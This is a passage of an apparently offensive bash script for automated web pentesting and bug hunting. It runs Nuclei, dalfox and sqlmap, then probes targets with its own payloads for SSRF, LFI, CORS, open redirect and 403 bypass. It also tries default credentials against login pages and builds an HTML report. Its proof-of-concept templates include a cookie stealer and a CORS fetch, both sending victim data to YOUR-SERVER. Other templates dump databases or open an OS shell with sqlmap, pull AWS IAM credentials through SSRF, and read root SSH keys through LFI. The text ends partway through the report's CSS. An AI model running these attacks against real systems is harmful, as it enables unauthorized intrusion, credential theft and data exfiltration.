# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PHASE 4 — AUTOMATED VULNERABILITY SCANNING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
phase "PHASE 4 — AUTOMATED VULNERABILITY SCANNING"

# 4.1 Nuclei Full Scan
log "Running full Nuclei scan (updating templates first)..."
nuclei -update-templates -silent 2>/dev/null || true

nuclei -l "$R02/live_urls.txt" \
  -t "$HOME/nuclei-templates/" \
  -tags cve,rce,sqli,xss,ssrf,lfi,idor,cors,exposure,misconfig,takeover,default-login \
  -severity critical,high,medium \
  -rate-limit "$RATE" \
  -bulk-size 25 \
  -concurrency 10 \
  -silent -jsonl \
  -o "$R04/nuclei_results.jsonl" 2>/dev/null || true

# Parse nuclei results
if [[ -s "$R04/nuclei_results.jsonl" ]]; then
  COUNT=$(wc -l < "$R04/nuclei_results.jsonl")
  ok "Nuclei found $COUNT potential issues — verifying..."
  python3 << 'PYEOF'
import json, os
findings_file = os.environ.get('FINDINGS', '$FINDINGS')
sev_cvss = {"critical":"9.5","high":"7.8","medium":"5.4","low":"3.1"}
try:
    with open('$FINDINGS') as f: data = json.load(f)
    with open('$R04/nuclei_results.jsonl') as f:
        for line in f:
            try:
                n = json.loads(line.strip())
                sev = n.get('info',{}).get('severity','info').lower()
                if sev in ('info','unknown'): continue
                name = n.get('info',{}).get('name','')
                url  = n.get('matched-at','')
                tid  = n.get('template-id','')
                desc = n.get('info',{}).get('description','')
                rem  = n.get('info',{}).get('remediation','Review and patch')
                ref  = n.get('info',{}).get('reference',[''])[0] if n.get('info',{}).get('reference') else ''
                evid = n.get('extracted-results',[])
                evid_str = ', '.join(str(e) for e in evid[:3]) if evid else f"Nuclei template {tid} matched"
                data['findings'].append({
                    "title": name, "severity": sev.upper(),
                    "cvss": sev_cvss.get(sev,"5.0"), "tool": "nuclei",
                    "url": url, "parameter": "", "category": "nuclei",
                    "evidence": evid_str,
                    "poc": f"nuclei -u '{url}' -t {tid}\ncurl -sk '{url}'",
                    "remediation": rem
                })
            except: pass
    with open('$FINDINGS','w') as f: json.dump(data,f,indent=2)
except Exception as e: print(f"Error: {e}")
PYEOF
fi

# 4.2 Subdomain Takeover Deep Check
log "Deep subdomain takeover analysis..."
TAKEOVER_SIGS=(
  "NoSuchBucket:s3.amazonaws.com:CRITICAL"
  "There is no app here:heroku.com:HIGH"
  "404 Not Found:github.io:HIGH"
  "Domain not found:fastly.com:HIGH"
  "The feed has not been found:feedpress.me:HIGH"
  "No settings were found for this company:help.shopify.com:HIGH"
  "Unrecognized domain:readme.io:MEDIUM"
  "Project not found:netlify.app:HIGH"
  "Repository not found:github.io:HIGH"
  "This UserVoice subdomain is currently available:uservoice.com:MEDIUM"
  "404 error unknown site:wpengine.com:MEDIUM"
  "This page is parked free:godaddy.com:MEDIUM"
)

while IFS= read -r line; do
  sub=$(echo "$line" | awk '{print $1}')
  cname=$(echo "$line" | grep -oP 'CNAME\s+\K\S+' 2>/dev/null || true)
  [[ -z "$cname" ]] && continue
  CONTENT=$(curl -sk --max-time 8 "https://$sub" 2>/dev/null || true)
  for SIG_ENTRY in "${TAKEOVER_SIGS[@]}"; do
    SIG="${SIG_ENTRY%%:*}"; REST="${SIG_ENTRY#*:}"
    SVC="${REST%%:*}"; TSEV="${REST##*:}"
    if echo "$CONTENT" | grep -qi "$SIG" && echo "$cname" | grep -qi "$SVC"; then
      vuln "SUBDOMAIN TAKEOVER: $sub → $cname [$TSEV]"
      add_finding "Subdomain Takeover: $sub" "$TSEV" "8.1" "custom" \
        "https://$sub" "DNS CNAME" \
        "$sub CNAME $cname — shows: $SIG" \
        "# Step 1: Confirm CNAME\ndig CNAME $sub\n\n# Step 2: Register the unclaimed service\n# Go to $SVC and claim: $cname\n\n# Step 3: Host content to prove ownership" \
        "Remove dangling DNS record or re-claim the service on $SVC." "dns"
      notify "SUBDOMAIN TAKEOVER: $sub on $TARGET"
    fi
  done
done < "$R01/dns_full.txt"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PHASE 5 — DEEP VULNERABILITY VERIFICATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
phase "PHASE 5 — DEEP VULNERABILITY VERIFICATION"

# 5.1 XSS — Multi-engine
log "XSS testing with dalfox (all param URLs)..."
if [[ -s "$R03/param_urls.txt" ]]; then
  check_tool dalfox && dalfox file "$R03/param_urls.txt" \
    --skip-bav --no-spinner --silence \
    --mining-dict --mining-dom \
    --format json \
    -o "$R05/xss_results.json" 2>/dev/null || true

  python3 << 'PYEOF'
import json, os
try:
    with open('$FINDINGS') as f: data = json.load(f)
    with open('$R05/xss_results.json') as f: results = json.load(f)
    for r in (results if isinstance(results,list) else []):
        url   = r.get('data',{}).get('url','') or r.get('url','')
        param = r.get('data',{}).get('param','') or r.get('param','')
        payload=r.get('data',{}).get('payload','') or r.get('payload','')
        ptype = r.get('type','Reflected XSS')
        if not (url and payload): continue
        data['findings'].append({
            "title": f"Cross-Site Scripting (XSS) — {ptype}",
            "severity":"HIGH","cvss":"7.4","tool":"dalfox",
            "url":url,"parameter":param,"category":"xss",
            "evidence":f"Payload confirmed: {payload[:150]}",
            "poc":f"# Browser PoC:\n{url}?{param}={payload}\n\n# Cookie stealer:\n{url}?{param}=<script>document.location='https://YOUR-SERVER/?c='+document.cookie</script>\n\n# Verify with curl:\ncurl -sk '{url}' --data '{param}={payload}'",
            "remediation":"HTML-encode all output. Implement strict CSP. Use framework XSS protections."
        })
    with open('$FINDINGS','w') as f: json.dump(data,f,indent=2)
except: pass
PYEOF
fi

# 5.2 SQL Injection
if [[ "$SKIP_HEAVY" == "false" ]] && [[ -s "$R03/param_urls.txt" ]]; then
  log "SQL injection testing with sqlmap..."
  check_tool sqlmap && sqlmap \
    -m "$R03/param_urls.txt" \
    --batch --random-agent \
    --level=2 --risk=2 \
    --forms --crawl=2 \
    --technique=BEUSTQ \
    --output-dir="$R05/sqlmap/" \
    --results-file="$R05/sqlmap_results.csv" \
    2>/dev/null || true

  if [[ -f "$R05/sqlmap_results.csv" ]] && \
     grep -q "True" "$R05/sqlmap_results.csv" 2>/dev/null; then
    while IFS=',' read -r url param dbms os user; do
      [[ "$param" == "Parameter" || -z "$param" ]] && continue
      vuln "SQL INJECTION CONFIRMED: $url | Param: $param | DBMS: $dbms"
      add_finding "SQL Injection" "CRITICAL" "9.8" "sqlmap" \
        "$url" "$param" \
        "Confirmed injectable. DBMS: $dbms | OS: $os | User: $user" \
        "# Dump databases:\nsqlmap -u '$url' -p '$param' --dbs --batch\n\n# Dump tables:\nsqlmap -u '$url' -p '$param' -D <db> --tables --batch\n\n# Dump data:\nsqlmap -u '$url' -p '$param' -D <db> -T users --dump --batch\n\n# OS shell (if privileged):\nsqlmap -u '$url' --os-shell --batch" \
        "Use prepared statements/parameterized queries. Apply WAF rules. Principle of least privilege on DB user." "sqli"
      notify "SQL INJECTION on $TARGET! Param: $param"
    done < "$R05/sqlmap_results.csv"
  fi
fi

# 5.3 CORS Misconfiguration
log "CORS misconfiguration testing..."
TEST_ORIGINS=(
  "https://evil.attacker-test.invalid"
  "null"
  "https://${TARGET}.attacker-test.invalid"
  "https://attacker-test.invalid.${TARGET}"
)
while IFS= read -r LURL; do
  [[ -z "$LURL" ]] && continue
  for ORIGIN in "${TEST_ORIGINS[@]}"; do
    HEADERS=$(curl -sk -H "Origin: $ORIGIN" \
      -o /dev/null -D - --max-time 5 "$LURL" 2>/dev/null | head -20 || true)
    ACAO=$(echo "$HEADERS" | grep -i "access-control-allow-origin" \
      | awk '{print $2}' | tr -d '\r\n')
    ACAC=$(echo "$HEADERS" | grep -i "access-control-allow-credentials" \
      | awk '{print $2}' | tr -d '\r\n')
    if [[ -n "$ACAO" && "$ACAO" != "" ]]; then
      if [[ "$ACAO" == "$ORIGIN" || "$ACAO" == "*" || "$ACAO" == "null" ]]; then
        if [[ "$ACAC" =~ [Tt]rue || "$ACAO" == "*" ]]; then
          vuln "CORS MISCONFIGURATION: $LURL (Origin: $ORIGIN → ACAO: $ACAO, ACAC: $ACAC)"
          add_finding "CORS Misconfiguration" "HIGH" "7.5" "curl" \
            "$LURL" "Origin header" \
            "ACAO: $ACAO | ACAC: $ACAC | Test origin: $ORIGIN" \
            "# Verify:\ncurl -sk -H 'Origin: $ORIGIN' '$LURL' -I\n\n# JavaScript exploit PoC:\nfetch('$LURL',{credentials:'include'})\n  .then(r=>r.json())\n  .then(d=>fetch('https://YOUR-SERVER/?data='+btoa(JSON.stringify(d))))" \
            "Validate Origin against explicit whitelist. Never combine wildcard with credentials:true." "cors"
          break 2
        fi
      fi
    fi
  done
done < "$R02/live_urls.txt"

# 5.4 Open Redirect
log "Open redirect testing..."
REDIRECT_PARAMS=(redirect return url next goto dest target redir continue
                  forward redirect_uri callback returnUrl redirectUrl
                  returnTo successUrl failUrl landingUrl link)
REDIRECT_PAYLOADS=(
  "https://redirect-test.invalid"
  "//redirect-test.invalid"
  "/\\redirect-test.invalid"
  "https:redirect-test.invalid"
  "%2F%2Fredirect-test.invalid"
)
while IFS= read -r PURL; do
  for PARAM in "${REDIRECT_PARAMS[@]}"; do
    if echo "$PURL" | grep -qi "${PARAM}="; then
      for PAYLOAD in "${REDIRECT_PAYLOADS[@]}"; do
        TESTURL=$(echo "$PURL" | sed "s|${PARAM}=[^&]*|${PARAM}=${PAYLOAD}|gi" | head -1)
        LOCATION=$(curl -sk -o /dev/null \
          -w "%{redirect_url}" --max-time 5 "$TESTURL" 2>/dev/null || true)
        if echo "$LOCATION" | grep -qi "redirect-test.invalid"; then
          vuln "OPEN REDIRECT: $PURL (param: $PARAM → $PAYLOAD)"
          add_finding "Open Redirect" "MEDIUM" "6.1" "curl" \
            "$PURL" "$PARAM" \
            "Redirect to $PAYLOAD confirmed via $PARAM parameter" \
            "# Verify:\ncurl -Lv '$TESTURL'\n\n# Phishing PoC:\n# Replace redirect-test.invalid with attacker site\n# Send crafted URL to victim as legitimate-looking link" \
            "Validate redirect URLs against whitelist of allowed domains. Use relative paths only." "redirect"
          break 2
        fi
      done
    fi
  done
done < "$R03/param_urls.txt"

# 5.5 SSRF Detection
log "SSRF vulnerability testing..."
SSRF_PARAMS=(url file path dest src redirect proxy load fetch
             image document import callback data content target)
SSRF_PAYLOADS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://metadata.google.internal/"
  "http://100.100.100.200/latest/meta-data/"
  "http://127.0.0.1/"
  "http://localhost/"
  "http://[::1]/"
  "http://0.0.0.0/"
  "http://0177.0.0.1/"
)
while IFS= read -r PURL; do
  for PARAM in "${SSRF_PARAMS[@]}"; do
    if echo "$PURL" | grep -qi "${PARAM}="; then
      for PAYLOAD in "${SSRF_PAYLOADS[@]}"; do
        TESTURL=$(echo "$PURL" | sed "s|${PARAM}=[^&]*|${PARAM}=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))" 2>/dev/null || echo "$PAYLOAD")|gi" | head -1)
        RESP=$(curl -sk --max-time 8 "$TESTURL" 2>/dev/null | head -c 500 || true)
        if echo "$RESP" | grep -qiE "ami-id|instance-id|iam|metadata|169\.254|google|computeMetadata"; then
          vuln "SSRF CONFIRMED: $PURL (param: $PARAM → $PAYLOAD)"
          add_finding "Server-Side Request Forgery (SSRF)" "CRITICAL" "9.3" "curl" \
            "$PURL" "$PARAM" \
            "SSRF confirmed — internal metadata accessible via $PARAM: $(echo $RESP | head -c 200)" \
            "# Cloud metadata exfil:\ncurl '$TESTURL'\n\n# AWS keys via SSRF:\ncurl '${PURL/${PARAM}=*/}${PARAM}=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n\n# Internal port scan via SSRF:\nfor port in 22 80 443 3306 6379 8080 8443; do\n  curl -sk '${PURL/${PARAM}=*/}${PARAM}=http://127.0.0.1:'\$port -m 2\ndone" \
            "Whitelist allowed destinations. Block internal IP ranges. Use SSRF-safe HTTP libraries." "ssrf"
          notify "SSRF CONFIRMED on $TARGET! Param: $PARAM"
          break 2
        fi
      done
    fi
  done
done < "$R03/param_urls.txt"

# 5.6 LFI / Path Traversal
log "Local File Inclusion testing..."
LFI_PARAMS=(file path page include load template dir doc)
LFI_PAYLOADS=(
  "../../../etc/passwd"
  "....//....//....//etc/passwd"
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  "..%252f..%252f..%252fetc%252fpasswd"
  "/etc/passwd"
  "php://filter/convert.base64-encode/resource=/etc/passwd"
  "file:///etc/passwd"
)
while IFS= read -r PURL; do
  for PARAM in "${LFI_PARAMS[@]}"; do
    if echo "$PURL" | grep -qi "${PARAM}="; then
      for PAYLOAD in "${LFI_PAYLOADS[@]}"; do
        TESTURL=$(echo "$PURL" | sed "s|${PARAM}=[^&]*|${PARAM}=$PAYLOAD|gi" | head -1)
        RESP=$(curl -sk --max-time 8 "$TESTURL" 2>/dev/null | head -c 1000 || true)
        if echo "$RESP" | grep -qE "root:.*:0:0:|bin:.*:/bin|daemon:"; then
          vuln "LFI CONFIRMED: $TESTURL"
          add_finding "Local File Inclusion (LFI)" "CRITICAL" "9.1" "curl" \
            "$PURL" "$PARAM" \
            "LFI confirmed — /etc/passwd readable via $PARAM parameter" \
            "# Read /etc/passwd:\ncurl '$TESTURL'\n\n# Read SSH key:\ncurl '${PURL/${PARAM}=*/}${PARAM}=../../../root/.ssh/id_rsa'\n\n# PHP filter (base64):\ncurl '${PURL/${PARAM}=*/}${PARAM}=php://filter/convert.base64-encode/resource=index.php' | base64 -d" \
            "Validate file paths against whitelist. Use basename() to strip traversal. Disable allow_url_include." "lfi"
          notify "LFI on $TARGET! Param: $PARAM"
          break 2
        fi
      done
    fi
  done
done < "$R03/param_urls.txt"

# 5.7 HTTP Security Headers
log "Security header analysis..."
HEADERS_RESP=$(curl -sk -I --max-time 10 "https://$TARGET" 2>/dev/null || true)
declare -A HCHECKS=(
  ["strict-transport-security"]="Missing HSTS — MITM/downgrade attacks possible"
  ["content-security-policy"]="Missing CSP — XSS impact amplified"
  ["x-frame-options"]="Missing X-Frame-Options — Clickjacking possible"
  ["x-content-type-options"]="Missing X-Content-Type-Options — MIME sniffing"
  ["referrer-policy"]="Missing Referrer-Policy — URL leakage"
  ["permissions-policy"]="Missing Permissions-Policy — feature abuse"
)
MISSING_H=""
for h in "${!HCHECKS[@]}"; do
  echo "$HEADERS_RESP" | grep -qi "$h" || MISSING_H="$MISSING_H\n- ${HCHECKS[$h]}"
done
if [[ -n "$MISSING_H" ]]; then
  add_finding "Missing HTTP Security Headers" "LOW" "4.3" "curl" \
    "https://$TARGET" "response headers" \
    "Missing headers:$MISSING_H" \
    "curl -sk -I 'https://$TARGET' | grep -iE 'strict|csp|x-frame|x-content|referrer|permissions'" \
    "Add security headers in server/CDN config. Use securityheaders.com to validate." "headers"
fi

# 5.8 403 Bypass
log "403 bypass testing..."
grep -E ' 403 ' "$R03/ffuf_dirs.json" 2>/dev/null \
  | python3 -c "
import json,sys
try:
  for line in sys.stdin:
    d=json.loads(line)
    path=d.get('input',{}).get('FUZZ','')
    if path: print('/'+path)
except: pass
" 2>/dev/null | head -20 | while read -r RPATH; do
  URL="https://$TARGET$RPATH"
  declare -A BYPASS_TESTS=(
    ["X-Original-URL: $RPATH"]="curl -sk -o /dev/null -w '%{http_code}' -H 'X-Original-URL: $RPATH' '$URL'"
    ["X-Forwarded-For: 127.0.0.1"]="curl -sk -o /dev/null -w '%{http_code}' -H 'X-Forwarded-For: 127.0.0.1' '$URL'"
    ["X-Custom-IP: 127.0.0.1"]="curl -sk -o /dev/null -w '%{http_code}' -H 'X-Custom-IP-Authorization: 127.0.0.1' '$URL'"
    ["Path rewrite /./"]="curl -sk -o /dev/null -w '%{http_code}' '${URL%$RPATH}/.${RPATH}'"
    ["URL encode %2F"]="curl -sk -o /dev/null -w '%{http_code}' '$(echo $URL | sed "s|$RPATH|$(python3 -c "import urllib.parse; print(urllib.parse.quote('$RPATH'))" 2>/dev/null)||')'"
  )
  for method in "${!BYPASS_TESTS[@]}"; do
    CODE=$(eval "${BYPASS_TESTS[$method]}" 2>/dev/null || echo "000")
    if [[ "$CODE" == "200" ]]; then
      vuln "403 BYPASS: $URL via $method → HTTP 200"
      add_finding "403 Access Control Bypass" "HIGH" "7.5" "curl" \
        "$URL" "header/path" \
        "403 bypassed via: $method → HTTP 200" \
        "curl -sk -H '$method' '$URL'\n\n# If X-Original-URL works:\ncurl -sk -H 'X-Original-URL: $RPATH' 'https://$TARGET/'\n\n# If path rewrite works:\ncurl -sk 'https://$TARGET/.$RPATH'" \
        "Fix authorization at application layer. Do not rely on URL-based restrictions. Validate auth server-side for every request." "bypass"
    fi
  done
done || true

# 5.9 Broken Authentication Checks
log "Testing authentication weaknesses..."
AUTH_PATHS=("/login" "/signin" "/admin/login" "/wp-login.php" "/api/login" "/auth/login")
DEFAULT_CREDS=(
  "admin:admin" "admin:password" "admin:123456" "admin:admin123"
  "admin:letmein" "admin:changeme" "root:root" "root:toor"
  "test:test" "guest:guest" "user:user" "administrator:administrator"
)
for APATH in "${AUTH_PATHS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    --max-time 5 "https://$TARGET$APATH" 2>/dev/null || echo "000")
  if [[ "$CODE" == "200" || "$CODE" == "302" ]]; then
    for CRED in "${DEFAULT_CREDS[@]}"; do
      USER="${CRED%%:*}"; PASS="${CRED##*:}"
      RESP=$(curl -sk -o /dev/null -w "%{http_code}" \
        -c "$TMPDIR/auth_cookies.txt" \
        --max-time 10 \
        -d "username=$USER&password=$PASS&user=$USER&pass=$PASS&email=$USER@$TARGET&Login=Login" \
        "https://$TARGET$APATH" 2>/dev/null || echo "000")
      # Check for successful auth (redirect to dashboard or 200 with dashboard content)
      if [[ "$RESP" == "302" || "$RESP" == "200" ]]; then
        LOCATION=$(curl -sk -I -d "username=$USER&password=$PASS" \
          --max-time 5 "https://$TARGET$APATH" 2>/dev/null \
          | grep -i location | awk '{print $2}' | tr -d '\r')
        if echo "$LOCATION" | grep -qiE "dashboard|admin|home|panel|account"; then
          vuln "DEFAULT CREDENTIALS: $USER:$PASS works on $TARGET$APATH"
          add_finding "Default/Weak Credentials" "CRITICAL" "9.8" "curl" \
            "https://$TARGET$APATH" "username/password" \
            "Login succeeded with: $USER:$PASS — redirected to: $LOCATION" \
            "curl -sk -c cookies.txt -d 'username=$USER&password=$PASS' 'https://$TARGET$APATH' -L\n# Then access with cookies:\ncurl -sk -b cookies.txt 'https://$TARGET/admin/'" \
            "Change all default credentials immediately. Implement account lockout after 5 failed attempts. Require strong password policy. Add MFA." "auth"
          notify "DEFAULT CREDS FOUND: $USER:$PASS on $TARGET$APATH"
          break
        fi
      fi
    done
  fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PHASE 6 — BUG CHAIN ANALYSIS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
phase "PHASE 6 — BUG CHAIN ANALYSIS"
log "Analyzing finding combinations for vulnerability chains..."

python3 << 'PYEOF'
import json

try:
    with open('$FINDINGS') as f: data = json.load(f)
    findings = data['findings']

    sevs = [f['severity'] for f in findings]
    cats = [f.get('category','') for f in findings]
    chains = []

    # Chain: XSS + Missing CSP = amplified impact
    if 'xss' in cats:
        missing_h = [f for f in findings if 'Security Headers' in f.get('title','')]
        if missing_h:
            chains.append({
                "chain": "XSS + Missing CSP",
                "impact": "CRITICAL",
                "description": "XSS vulnerability amplified by missing Content-Security-Policy. Attacker can execute arbitrary JavaScript with no restrictions.",
                "combined_cvss": "9.3"
            })

    # Chain: Open Redirect + XSS = Account Takeover
    if 'redirect' in cats and 'xss' in cats:
        chains.append({
            "chain": "Open Redirect + XSS → Account Takeover",
            "impact": "CRITICAL",
            "description": "Combine open redirect with XSS to bypass same-origin policy restrictions and steal session cookies.",
            "combined_cvss": "9.6"
        })

    # Chain: SSRF + Internal Services = Full Compromise
    if 'ssrf' in cats and any('Exposed' in f.get('title','') for f in findings):
        chains.append({
            "chain": "SSRF + Exposed Internal Services",
            "impact": "CRITICAL",
            "description": "SSRF can be used to reach exposed internal services (Redis, MongoDB, etc.) for full infrastructure compromise.",
            "combined_cvss": "9.9"
        })

    # Chain: SQLi + Exposed DB Port
    if 'sqli' in cats and any('MySQL' in f.get('title','') or 'PostgreSQL' in f.get('title','') for f in findings):
        chains.append({
            "chain": "SQLi + Direct Database Access",
            "impact": "CRITICAL",
            "description": "SQL injection combined with direct database port exposure allows direct data exfiltration.",
            "combined_cvss": "9.9"
        })

    # Chain: LFI + Log Poisoning = RCE
    if 'lfi' in cats:
        chains.append({
            "chain": "LFI → Log Poisoning → RCE",
            "impact": "CRITICAL",
            "description": "LFI can be escalated to RCE via log poisoning: inject PHP into access logs then include the log file.",
            "combined_cvss": "9.9"
        })

    data['chains'] = chains
    if chains:
        print(f"\n[CHAIN ANALYSIS] Found {len(chains)} vulnerability chains!")
        for c in chains:
            print(f"  ⛓  {c['chain']} → {c['impact']} (CVSS {c['combined_cvss']})")

    with open('$FINDINGS', 'w') as f: json.dump(data, f, indent=2)
except Exception as e:
    print(f"Chain analysis error: {e}")
PYEOF

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PHASE 7 — PROFESSIONAL REPORT GENERATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
phase "PHASE 7 — PROFESSIONAL REPORT GENERATION"
log "Generating professional HTML report..."

REPORT_PATH="$R07/hackerofhell_${TARGET}_$(date +%Y%m%d_%H%M%S).html"

python3 << 'PYEOF'
import json, os
from datetime import datetime

with open(os.path.expandvars('$FINDINGS')) as f:
    data = json.load(f)

target   = data['target']
findings = data['findings']
chains   = data.get('chains', [])
date_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')
author   = data.get('author','RAJESH BAJIYA')
handle   = data.get('handle','HACKEROFHELL')
mode     = data.get('mode','normal').upper()

sev_order = {'CRITICAL':0,'HIGH':1,'MEDIUM':2,'LOW':3,'INFO':4}
sev_colors = {'CRITICAL':'#ff2d55','HIGH':'#ff6b35','MEDIUM':'#ffd60a','LOW':'#30d158','INFO':'#636366'}
findings.sort(key=lambda x: sev_order.get(x.get('severity','INFO'),5))

sev_counts = {}
for f in findings:
    s = f.get('severity','INFO')
    sev_counts[s] = sev_counts.get(s, 0) + 1

total = len(findings)
risk_score = sev_counts.get('CRITICAL',0)*10 + sev_counts.get('HIGH',0)*7 + sev_counts.get('MEDIUM',0)*4

# Build findings HTML
findings_html = ""
for i,f in enumerate(findings):
    sev = f.get('severity','INFO')
    col = sev_colors.get(sev,'#888')
    poc = f.get('poc','').replace('&','&amp;').replace('<','&lt;').replace('>','&gt;')
    ev  = str(f.get('evidence','')).replace('<','&lt;').replace('>','&gt;')
    rem = f.get('remediation','').replace('<','&lt;').replace('>','&gt;')
    findings_html += f"""
    <div class="finding" id="f{i}">
      <div class="fh" onclick="tog('f{i}')">
        <div class="fl">
          <span class="sp" style="color:{col};border-color:{col}40;background:{col}18">{sev}</span>
          <span class="cv">CVSS {f.get('cvss','?')}</span>
          <span class="fn">{f.get('title','')}</span>
        </div>
        <div class="fr">
          <span class="tt">{f.get('tool','')}</span>
          <span class="ch" id="ch{i}">▼</span>
        </div>
      </div>
      <div class="fb" id="fb{i}" style="display:none">
        <div class="dg">
          <div>
            <div class="ds"><div class="dl">AFFECTED URL</div>
              <div class="dv url">{f.get('url','')}</div></div>
            <div class="ds"><div class="dl">PARAMETER / LOCATION</div>
              <div class="dv">{f.get('parameter','N/A')}</div></div>
            <div class="ds"><div class="dl">EVIDENCE</div>
              <div class="ev">{ev}</div></div>
            <div class="ds"><div class="dl">REMEDIATION</div>
              <div class="rm">{rem}</div></div>
          </div>
          <div>
            <div class="ds"><div class="dl">PROOF OF CONCEPT</div>
              <div class="poc">{poc}</div>
              <button class="cpb" onclick="cp({i})">⎘ COPY PoC</button>
            </div>
          </div>
        </div>
      </div>
    </div>"""

# Chains HTML
chains_html = ""
if chains:
    for c in chains:
        chains_html += f"""
        <div class="chain-card">
          <div class="chain-badge">⛓ CHAIN — {c.get('impact','CRITICAL')} — CVSS {c.get('combined_cvss','9.9')}</div>
          <div class="chain-title">{c.get('chain','')}</div>
          <div class="chain-desc">{c.get('description','')}</div>
        </div>"""

sev_bars = ""
for sev in ['CRITICAL','HIGH','MEDIUM','LOW']:
    cnt = sev_counts.get(sev,0)
    col = sev_colors.get(sev,'#888')
    pct = int(cnt / max(total,1) * 100)
    sev_bars += f"""<div class="sr">
      <span class="sl" style="color:{col}">{sev}</span>
      <div class="sw"><div class="sb" style="width:{pct}%;background:{col}"></div></div>
      <span class="sc">{cnt}</span></div>"""

html = f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>HackerOfHell — Pentest Report: {target}</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;600;700&display=swap');
:root{{--bg:#050a0f;--s:#0a1520;--s2:#0f1e2e;--b:#1a3a5c;--t:#c8e6f0;--m:#4a7a9b;
--a:#00d4ff;--a2:#ff6b35;--a3:#39ff14;--a4:#bf5af2;
--cr:#ff2d55;--hi:#ff6b35;--me:#ffd60a;--lo:#30d158;}}
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:var(--bg);color:var(--t);font-family:'Rajdhani',sans-serif;min-height:100vh}}
body::before{{content:'';position:fixed;top:0;left:0;right:0;bottom:0;
  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,212,255,.012) 2px,rgba(0,212,255,.012) 4px);
  pointer-events:none;z-index:9999}}
.page{{max-width:1300px;margin:0 auto;padding:30px 24px}}
/* HEADER */
.rh{{display:grid;grid-template-columns:1fr auto;gap:24px;align-items:start;
  margin-bottom:40px;padding:30px;border:1px solid var(--b);
  background:var(--s);border-top:3px solid var(--a)}}
.ascii{{font-family:'Share Tech Mono',monospace;font-size:.55rem;line-height:1.3;
  color:var(--cr);white-space:pre}}
.rt{{font-family:'Orbitron',monospace;font-size:1.8rem;font-weight:900;
  letter-spacing:.05em;background:linear-gradient(135deg,var(--a),var(--a4),var(--cr));
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;margin:16px 0 8px}}
.rm2{{font-family:'Share Tech Mono',monospace;font-size:.7rem;color:var(--m);line-height:2}}
.rm2 span{{color:var(--a3)}}
.risk{{background:var(--s2);border:1px solid var(--b);padding:20px 28px;text-align:center}}
.rn{{font-family:'Share Tech Mono',monospace;font-size:3rem;font-weight:700;
  color:var(--cr);line-height:1;text-shadow:0 0 30px rgba(255,45,85,.5)}}
.rl{{font-size:.6rem;letter-spacing:.2em;color:var(--m);margin-top:6px;text-transform:uppercase}}
/* STATS */
.sg{{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-bottom:30px}}
.sc2{{background:var(--s);border:1px solid var(--b);padding:20px}}
.ct{{font-family:'Share Tech Mono',monospace;font-size:.58rem;letter-spacing:.25em;
  color:var(--a);margin-bottom:14px;border-bottom:1px solid var(--b);padding-bottom:8px;text-transform:uppercase}}
.sr{{display:flex;align-items:center;gap:10px;margin-bottom:10px}}
.sl{{font-family:'Share Tech Mono',monospace;font-size:.72rem;font-weight:700;width:75px}}
.sw{{flex:1;height:5px;background:var(--b)}}
.sb{{height:100%}}
.sc{{font-family:'Share Tech Mono',monospace;font-size:.7rem;color:var(--m);width:20px;text-align:right}}
.stg{{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}}
.si{{background:var(--bg);border:1px solid var(--b);padding:14px;text-align:center}}
.sn{{font-family:'Share Tech Mono',monospace;font-size:1.6rem;font-weight:700;color:var(--a)}}
.slb{{font-size:.58rem;color:var(--m);letter-spacing:.1em;text-transform:uppercase;margin-top:4px}}
/* CHAINS */
.chains{{margin-bottom:30px}}
.chain-card{{background:var(--s);border:1px solid var(--b);border-left:3px solid var(--cr);
  padding:18px 20px;margin-bottom:10px}}
.chain-badge{{font-family:'Share Tech Mono',monospace;font-size:.65rem;color:var(--cr);
  letter-spacing:.1em;margin-bottom:8px}}
.chain-title{{font-family:'Orbitron',monospace;font-size:.85rem;font-weight:700;
  color:var(--t);margin-bottom:6px}}
.chain-desc{{font-size:.82rem;color:var(--m);line-height:1.6}}
/* FINDINGS */
.ftitle{{font-family:'Share Tech Mono',monospace;font-size:.6rem;letter-spacing:.25em;
  color:var(--a);margin-bottom:12px;border-bottom:1px solid var(--b);
  padding-bottom:10px;text-transform:uppercase}}
.finding{{border:1px solid var(--b);margin-bottom:6px;background:var(--s)}}
.fh{{display:flex;justify-content:space-between;align-items:center;
  padding:13px 18px;cursor:pointer;transition:background .15s}}
.fh:hover{{background:var(--s2)}}
.fl{{display:flex;align-items:center;gap:10px}}
.fr{{display:flex;align-items:center;gap:8px}}
.sp{{font-family:'Share Tech Mono',monospace;font-size:.58rem;font-weight:700;
